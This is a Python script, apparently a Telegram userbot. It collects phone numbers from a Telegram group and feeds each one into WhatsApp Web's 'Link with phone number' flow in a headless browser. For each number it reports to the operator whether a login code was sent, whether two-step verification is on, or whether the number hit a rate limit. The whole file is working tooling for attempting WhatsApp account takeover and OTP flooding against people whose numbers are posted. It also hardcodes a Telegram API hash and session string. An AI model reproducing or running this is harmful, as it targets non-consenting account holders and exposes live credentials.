import asyncio
import re
import os
from flask import Flask
from threading import Thread
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from playwright.async_api import async_playwright

# --- 1. SERVER ---
app = Flask('')
@app.route('/')
def home(): return "Bot is Active - India Mode"

def run():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    Thread(target=run).start()

# --- 2. CONFIG ---
API_ID = 31177437
API_HASH = '2edea950fe232f2e0ba6febfcd036452'
SESSION_STR = '1BVtsOMIBu29KyU3npaBUEiwW_M1Mem4iKHV6kCENAw5OepzMGecUxHo5RdGmA9e_Pr2pQPbKlL8_McBe0JAnN5Hts1pHKeGZmV40oBZ6MKu5g-7xuJx1epZZWqN--W-l35ujcq3tl9pb_vALtAotdtNhvgwdgIcty8plWZkTrvS_ru1CQ5MUf_eTP9brXJfwOyn1vC92WVZSGWwApnWtlKX4mmEBEN3GXHUuCyPjp07RdgwadimysqHw-GoIENCdUIoHUkDepofk374gwGGnS4-YYBW81lv53-Pn6wLdi4hE3gxBNOMz29fVjlVa2cDgAvQSnCYsxCD8QqdBkh_VIyIRpeRaOCw='
GROUP_ID = -1003211737650 
TARGET_NAME = "Test Guy"

processed_numbers = set()

# --- 3. LOGIN LOGIC WITH DETAILED ERROR REPORTING ---
async def try_login(page, client, phone):
    # Sirf India (+91) format filter
    if not phone.startswith('+91'):
        if len(phone) == 10: phone = '+91' + phone
        else: return

    if phone in processed_numbers: return
    processed_numbers.add(phone)
    
    await client.send_message('me', f"🔍 **SCANNING INDIA NUMBER**\nTarget: `{phone}`")
    try:
        await page.goto("https://web.whatsapp.com/", timeout=100000)
        await asyncio.sleep(10) 
        
        link_selector = "text='Link with phone number'"
        await page.wait_for_selector(link_selector, timeout=60000)
        await page.click(link_selector)
        
        await asyncio.sleep(3)
        await page.fill('input[aria-label="Type your phone number."]', phone)
        await page.keyboard.press("Enter")
        await asyncio.sleep(5)

        # ERROR DETECTION LOGIC
        content = await page.content()
        if "is too short" in content or "invalid" in content.lower():
            reason = "❌ WRONG NUMBER (Number galat hai)"
        elif "Try again in" in content or "too many times" in content.lower():
            reason = "🚫 OTP LIMIT REACHED (Is number par OTP ki limit khatam hai)"
        elif "Two-step verification" in content:
            reason = "🔒 2FA ENABLED (Ispe 2-Step verification laga hai)"
        else:
            reason = "📩 OTP SENT (Wait for code...)"
            await client.send_message('me', f"✅ **STATUS UPDATE**\nNumber: `{phone}`\nResult: {reason}")
            return

        await client.send_message('me', f"⚠️ **LOGIN FAILED**\nNumber: `{phone}`\nReason: {reason}")

    except Exception as e:
        await client.send_message('me', f"❌ **SYSTEM ERROR**\nNumber: `{phone}`\nReason: Timeout ya Browser crash.")

async def main():
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True, args=["--no-sandbox", "--disable-gpu"])
        context = await browser.new_context()
        page = await context.new_page()
        
        client = TelegramClient(StringSession(SESSION_STR), API_ID, API_HASH)
        await client.start()

        # STEP A: SCAN ONLY LAST 10 MESSAGES
        await client.send_message('me', "🚀 **SCANNING LAST 10 NUMBERS...**")
        async for msg in client.iter_messages(GROUP_ID, limit=100): # 100 msg check karega taaki 10 numbers mil sakein
            if len(processed_numbers) >= 10: break
            if msg.text:
                num_match = re.search(r'\+?\d{10,15}', msg.text)
                if num_match:
                    await try_login(page, client, num_match.group())
                    await asyncio.sleep(15)

        # STEP B: NEW MESSAGES REAL-TIME
        @client.on(events.NewMessage(chats=GROUP_ID))
        async def handler(event):
            num_match = re.search(r'\+?\d{10,15}', event.raw_text)
            if num_match:
                await try_login(page, client, num_match.group())

        await client.run_until_disconnected()

if __name__ == "__main__":
    keep_alive()
    asyncio.run(main())
